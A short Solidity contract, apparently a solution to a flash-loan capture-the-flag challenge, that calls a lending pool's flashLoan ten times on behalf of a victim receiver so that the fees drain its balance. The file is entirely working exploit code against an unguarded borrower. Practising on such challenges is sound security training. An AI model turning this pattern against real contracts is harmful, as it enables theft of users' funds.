// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // set naive receiver pool as pool address.
    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    // call the naive receiver pool to do flash loan.
    function attack(address victim) public {
        for (int i=0; i < 10; i++ ) {
            pool.flashLoan(IERC3156FlashBorrower(victim), ETH, 1 ether, "");
        }
    }
}